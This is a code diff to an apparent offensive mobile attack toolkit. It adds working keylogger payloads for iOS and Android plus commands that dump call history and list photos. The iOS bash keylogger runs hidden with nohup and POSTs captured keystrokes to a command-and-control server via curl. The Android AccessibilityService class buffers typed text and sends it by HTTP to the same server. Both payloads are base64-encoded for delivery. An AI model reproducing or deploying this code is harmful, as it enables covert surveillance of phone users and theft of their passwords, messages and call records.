@@ -183,6 +183,12 @@ class MobileAttackPayloads:
             elif module == 'photos':
                 # Exfiltrate photos metadata
                 results['data_exfiltrated']['photos'] = self._ios_exfil_photos()
+            elif module == 'keylogger':
+                # Deploy iOS keylogger
+                results['data_exfiltrated']['keylogger'] = self._ios_deploy_keylogger()
+            elif module == 'call_logs':
+                # Get call logs
+                results['data_exfiltrated']['call_logs'] = self._ios_exfil_call_logs()
 
             results['modules_executed'].append(module)
 
@@ -206,6 +212,47 @@ class MobileAttackPayloads:
         """Exfiltrate iOS photos metadata"""
         photos_path = "/var/mobile/Media/DCIM"
         return f"find {photos_path} -type f"
+
+    def _ios_deploy_keylogger(self) -> str:
+        """
+        Deploy iOS keylogger to capture keyboard input
+        Uses IOKit framework hooking for keystroke interception
+        """
+        keylogger_script = f"""
+        #!/bin/bash
+        # iOS Keylogger - Hooks into keyboard input events
+        # Logs to C2 server: {self.c2_server}
+
+        cat > /tmp/ios_keylogger.sh <<'KEYLOG_EOF'
+        #!/bin/bash
+        while true; do
+            # Monitor keyboard cache and input buffers
+            log stream --predicate 'eventMessage contains "keyboard"' | \
+            while read line; do
+                timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+                echo "$timestamp | $line" >> /tmp/keylog.txt
+                # Exfiltrate to C2 every 100 lines
+                if [ $(wc -l < /tmp/keylog.txt) -gt 100 ]; then
+                    curl -X POST http://{self.c2_server}/keylog \\
+                        -H "Content-Type: application/json" \\
+                        -d "@/tmp/keylog.txt"
+                    > /tmp/keylog.txt
+                fi
+            done
+            sleep 1
+        done
+        KEYLOG_EOF
+
+        chmod +x /tmp/ios_keylogger.sh
+        nohup /tmp/ios_keylogger.sh > /dev/null 2>&1 &
+        echo "iOS Keylogger deployed - PID: $!"
+        """
+        return base64.b64encode(keylogger_script.encode()).decode()
+
+    def _ios_exfil_call_logs(self) -> str:
+        """Exfiltrate iOS call history"""
+        call_db_path = "/var/mobile/Library/CallHistoryDB/CallHistory.storedata"
+        return f"sqlite3 {call_db_path} 'SELECT * FROM call;'"
 
     # ================== ANDROID ATTACK VECTORS ==================
 
@@ -335,6 +382,12 @@ class MobileAttackPayloads:
             elif module == 'location':
                 # Get device location
                 results['data_exfiltrated']['location'] = self._android_get_location()
+            elif module == 'keylogger':
+                # Deploy Android keylogger
+                results['data_exfiltrated']['keylogger'] = self._android_deploy_keylogger()
+            elif module == 'photos':
+                # Exfiltrate photos metadata
+                results['data_exfiltrated']['photos'] = self._android_exfil_photos()
 
             results['modules_executed'].append(module)
 
@@ -357,6 +410,66 @@ class MobileAttackPayloads:
     def _android_get_location(self) -> str:
         """Get Android device location"""
         return "dumpsys location"
+
+    def _android_deploy_keylogger(self) -> str:
+        """
+        Deploy Android keylogger to capture keyboard input
+        Uses AccessibilityService API hooking for keystroke capture
+        """
+        keylogger_apk = f"""
+        import android.accessibilityservice.AccessibilityService;
+        import android.view.accessibility.AccessibilityEvent;
+        import java.io.*;
+        import java.net.*;
+
+        public class KeylogService extends AccessibilityService {{
+            private static final String C2_SERVER = "{self.c2_server}";
+            private static final int C2_PORT = {self.c2_port_android};
+            private StringBuilder keyBuffer = new StringBuilder();
+
+            @Override
+            public void onAccessibilityEvent(AccessibilityEvent event) {{
+                if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {{
+                    String text = event.getText().toString();
+                    keyBuffer.append(text);
+
+                    // Exfiltrate when buffer reaches 1000 chars
+                    if (keyBuffer.length() > 1000) {{
+                        exfiltrateKeys();
+                    }}
+                }}
+            }}
+
+            private void exfiltrateKeys() {{
+                new Thread(() -> {{
+                    try {{
+                        URL url = new URL("http://" + C2_SERVER + "/keylog");
+                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                        conn.setRequestMethod("POST");
+                        conn.setDoOutput(true);
+
+                        OutputStream os = conn.getOutputStream();
+                        os.write(keyBuffer.toString().getBytes());
+                        os.flush();
+                        os.close();
+
+                        keyBuffer.setLength(0);  // Clear buffer
+                        conn.getResponseCode();
+                    }} catch (Exception e) {{
+                        e.printStackTrace();
+                    }}
+                }}).start();
+            }}
+
+            @Override
+            public void onInterrupt() {{}}
+        }}
+        """
+        return base64.b64encode(keylogger_apk.encode()).decode()
+
+    def _android_exfil_photos(self) -> str:
+        """Exfiltrate Android photos metadata"""
+        return "find /sdcard/DCIM /sdcard/Pictures -type f -name '*.jpg' -o -name '*.png'"
 
     # ================== UNIFIED ATTACK INTERFACE ==================
 
